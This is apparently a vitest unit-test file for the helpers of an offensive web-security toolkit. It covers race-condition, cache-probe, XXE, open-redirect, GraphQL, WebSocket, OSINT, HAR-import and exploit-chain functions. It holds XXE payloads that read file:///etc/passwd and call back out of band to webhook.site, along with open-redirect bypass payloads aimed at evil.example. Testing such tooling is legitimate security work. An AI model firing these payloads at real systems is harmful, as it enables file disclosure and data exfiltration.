// Unit tests for the Tier-1 attack suite pure helpers (no network).
import { describe, expect, it } from "vitest";
import { cacheProbeSignals, raceClassify, buildXxeDoc, redirectVerdict, xxePayloads, xxeSignals } from "./proAttack";
import { batchVerdict, depthProbeQuery, parseGraphqlFields, parseSuggestions } from "./graphqlHunt";
import { cswshVerdict } from "./wsHunt";
import { domainDorks, parseGrepApp, repoSlug } from "./githubOsint";
import { harAuthHeaders, harCookieUnion, harEndpointSummary, harParamNames, parseHarEntries } from "./harImport";

describe("raceClassify", () => {
  it("flags all-success + mixed outcomes for unique nonce volley", () => {
    const results = [200, 200, 200, 200, 200].map((status, i) => ({ status, len: 10 + i, digest: `d${i}` }));
    const flags = raceClassify(5, results, true);
    expect(flags.some((f) => f.includes("duplicate-creation"))).toBe(true);
    expect(flags.some((f) => f.includes("outcome berbeda"))).toBe(true);
  });
  it("no flags on uniform failures", () => {
    const flags = raceClassify(3, [{ status: 0, len: 0, digest: "err" }, { status: 0, len: 0, digest: "err" }, { status: 0, len: 0, digest: "err" }], false);
    expect(flags.some((f) => f.includes("gagal"))).toBe(true);
    expect(flags.some((f) => f.includes("sukses"))).toBe(false);
  });
});

describe("cacheProbeSignals", () => {
  const base = { status: 200, body: "", headers: {}, ms: 1 };
  it("detects cacheable + reflected marker", () => {
    const sig = cacheProbeSignals(base, { status: 200, body: "aa abc.example.com bb", headers: { "x-cache": "HIT" }, ms: 2 }, "abc.example.com");
    expect(sig.some((s) => s.startsWith("cacheable"))).toBe(true);
    expect(sig.some((s) => s.includes("TERPANTUL"))).toBe(true);
  });
  it("detects marker in Location and status change", () => {
    const sig = cacheProbeSignals(base, { status: 302, body: "", headers: { location: "https://evil.example/" }, ms: 2 }, "evil.example");
    expect(sig.some((s) => s.includes("Location"))).toBe(true);
    expect(sig.some((s) => s.includes("status berubah"))).toBe(true);
  });
  it("silent on errors", () => {
    expect(cacheProbeSignals(base, { status: 0, body: "", headers: {}, ms: 1, error: "x" }, "m")).toEqual([]);
  });
});

describe("xxe payloads", () => {
  it("builds 4 payloads with OOB callback", () => {
    const ps = xxePayloads("https://webhook.site/xyz");
    expect(ps).toHaveLength(4);
    expect(ps[0].decl).toContain("file:///etc/passwd");
    expect(ps[1].decl).toContain("webhook.site/xyz/oob");
    expect(ps[2].selfClosing).toBe(true);
  });
  it("template substitution places decl+ref at {XXE}", () => {
    const doc = buildXxeDoc(xxePayloads("https://cb")[0], "<r><a>{XXE}</a></r>");
    expect(doc).toBe("<r><a><!ENTITY xxe SYSTEM \"file:///etc/passwd\">&xxe;</a></r>");
  });
  it("param-entity doc self-closes", () => {
    const doc = buildXxeDoc(xxePayloads("https://cb")[2]);
    expect(doc).toContain("%remote;");
    expect(doc.endsWith("<r/>")).toBe(true);
  });
  it("signals passwd leak", () => {
    const s = xxeSignals({ status: 200, body: "root:x:0:0:root:/root:/bin/bash\n", headers: {}, ms: 1 });
    expect(s.some((x) => x.includes("TERBACA"))).toBe(true);
  });
});

describe("redirectVerdict", () => {
  it("confirms external redirect and rejects same-host", () => {
    expect(redirectVerdict("https://evil.example/", "https://evil.example/x")).toBe("external-redirect");
    expect(redirectVerdict("//evil.example/", "//evil.example/y")).toBe("external-redirect");
    expect(redirectVerdict("https://evil.example/", "https://target.com/ok")).toBe("none");
    expect(redirectVerdict("https://evil.example/", "")).toBe("none");
  });
  it("payload echo inside query string is NOT a redirect", () => {
    expect(redirectVerdict("https://evil.example/", "https://target.com/?next=https://evil.example/")).toBe("none");
    expect(redirectVerdict("https://evil.example/", "/index?u=https%3A%2F%2Fevil.example%2F")).toBe("none");
  });
  it("userinfo + encoded-slash payloads", () => {
    expect(redirectVerdict("https://trusted.example@evil.example/", "https://trusted.example@evil.example/panel")).toBe("external-redirect");
    expect(redirectVerdict("https://evil.example%2f..%2f", "https://evil.example/../admin")).toBe("external-redirect");
  });
});

describe("graphql helpers", () => {
  it("parses Did-you-mean suggestions", () => {
    expect(parseSuggestions('Cannot query field "usr". Did you mean "users" or "user"?')).toEqual(["users", "user"]);
    expect(parseSuggestions("Did you mean `posts`?")).toEqual(["posts"]);
    expect(parseSuggestions("no hints")).toEqual([]);
  });
  it("parses shallow introspection fields", () => {
    const f = parseGraphqlFields({ data: { __schema: { queryType: { fields: [{ name: "me" }, { name: "users" }] }, mutationType: { fields: [{ name: "login" }] } } } });
    expect(f.query).toEqual(["me", "users"]);
    expect(f.mutation).toEqual(["login"]);
  });
  it("batch verdict", () => {
    expect(batchVerdict([{ data: {} }, { data: {} }])).toBe("batched");
    expect(batchVerdict({ data: { __typename: "Q" } })).toBe("single");
    expect(batchVerdict({ errors: [{ message: "x" }] })).toBe("rejected");
  });
  it("depth probe nests", () => {
    expect(depthProbeQuery("me", 3)).toBe("query DepthProbe{me{me{me{me}}}}");
  });
});

describe("cswshVerdict", () => {
  it("classifies origin validation", () => {
    expect(cswshVerdict(101, 101, 101)).toContain("TIDAK divalidasi");
    expect(cswshVerdict(403, 101, 101)).toContain("Origin divalidasi");
    expect(cswshVerdict(101, 403, 101)).toContain("sangat mungkin");
    expect(cswshVerdict(400, 400, 400)).toContain("tidak konklusif");
  });
});

describe("github osint helpers", () => {
  it("domain dorks", () => {
    const d = domainDorks("https://www.target.com/path");
    expect(d).toHaveLength(6);
    expect(d[0]).toContain('"target.com"');
    expect(domainDorks("not a domain")).toEqual([]);
  });
  it("repo slug", () => {
    expect(repoSlug("https://github.com/owner/repo.git")).toBe("owner/repo");
    expect(repoSlug("owner/repo")).toBe("owner/repo");
    expect(repoSlug("nope")).toBeNull();
  });
  it("grep.app parse (both schemas)", () => {
    const a = parseGrepApp({ hits: { hits: [{ _source: { repo: { raw: "a/b" }, path: { raw: "x.php" }, content: { snippet: "p" } } }] } });
    const b = parseGrepApp({ hits: { hits: [{ repo: "c/d", path: "y.php", content: { raw: "q" } }] } });
    expect(a[0].repo).toBe("a/b");
    expect(b[0].path).toBe("y.php");
    expect(parseGrepApp({})).toEqual([]);
  });
});

const HAR = JSON.stringify({
  log: { entries: [
    { request: { method: "GET", url: "http://x.test/api/doc?id=1", headers: [{ name: "Authorization", value: "Bearer abc" }], cookies: [{ name: "sid", value: "s1" }], queryString: [{ name: "id", value: "1" }] }, response: { status: 200, headers: [{ name: "Set-Cookie", value: "sid=s2; Path=/" }] } },
    { request: { method: "GET", url: "http://x.test/api/doc?id=1", headers: [], cookies: [], queryString: [{ name: "id", value: "1" }] }, response: { status: 200, headers: [] } },
    { request: { method: "POST", url: "http://y.test/login", headers: [], cookies: [], queryString: [] }, response: { status: 302, headers: [] } },
  ] },
});

describe("har import helpers", () => {
  it("parses entries", () => {
    const e = parseHarEntries(HAR);
    expect(e).toHaveLength(3);
    expect(e[0].host).toBe("x.test");
    expect(e[0].params).toEqual(["id"]);
    expect(parseHarEntries("not json")).toEqual([]);
    expect(parseHarEntries("{}")).toEqual([]);
  });
  it("endpoint summary dedupes with count", () => {
    const s = harEndpointSummary(parseHarEntries(HAR));
    expect(s.some((l) => l.includes("GET x.test/api/doc") && l.includes("×2"))).toBe(true);
  });
  it("param frequency", () => {
    expect(harParamNames(parseHarEntries(HAR))[0]).toEqual(["id", 2]);
  });
  it("cookie union prefers request then set-cookie", () => {
    const c = harCookieUnion(parseHarEntries(HAR), "x.test");
    expect(c.sid).toBe("s1");
  });
  it("auth headers masked", () => {
    const a = harAuthHeaders(parseHarEntries(HAR));
    expect(a[0]).toContain("authorization");
    expect(a[0]).not.toContain("Bearer abc\"");
    expect(a[0]).toMatch(/\(\d+c\)|pendek/);
  });
});

describe("harImport hardening (audit 2026-09-23)", () => {
  it("skips malformed entries instead of throwing", () => {
    const bad = JSON.stringify({ log: { entries: [{ request: null }, {}, { request: { method: "GET", url: "https://h.tld/a", headers: [{ name: null, value: "x" }, null], queryString: null, cookies: [{ name: "s" }] } }] } });
    expect(() => parseHarEntries(bad)).not.toThrow();
    expect(parseHarEntries(bad).length).toBe(1);
  });
  it("auth header shows presence only, zero value chars", () => {
    const e = parseHarEntries(JSON.stringify({ log: { entries: [{ request: { method: "GET", url: "https://h.tld/a", headers: [{ name: "Authorization", value: "Bearer supersecretvalue123" }] }, response: { status: 200, headers: [] } }] } }));
    const a = harAuthHeaders(e);
    expect(a[0]).toContain("present (");
    expect(a[0]).not.toContain("super");
  });
});

describe("recommendChains (auto-select ranking)", () => {
  it("ranks idor top with 2 sessions, flags missing setup honestly", async () => {
    const { recommendChains } = await import("./exploitChains");
    const r = recommendChains({ tech: "", endpoints: [{ path: "/api/dokumen", params: ["id"] }], proofText: "", sessions: ["a", "b"], hasToken: false, hasCreds: false });
    expect(r[0].chain).toBe("idor");
    expect(r[0].runnable).toBe(true);
    const fix = r.find((x) => x.chain === "session_fixation")!;
    expect(fix.runnable).toBe(false);
    expect(fix.reason).toMatch(/username\+password/);
  });
  it("boosts ssrf on URL-ish params and graphql on tech signal", async () => {
    const { recommendChains } = await import("./exploitChains");
    const r = recommendChains({ tech: "graphql", endpoints: [{ path: "/g", params: ["next"] }], proofText: "", sessions: [], hasToken: false, hasCreds: false });
    expect(r.find((x) => x.chain === "ssrf")!.score).toBeGreaterThanOrEqual(3);
    expect(r.find((x) => x.chain === "graphql")!.score).toBeGreaterThanOrEqual(3);
    expect(r.find((x) => x.chain === "idor")!.runnable).toBe(false);
  });
});
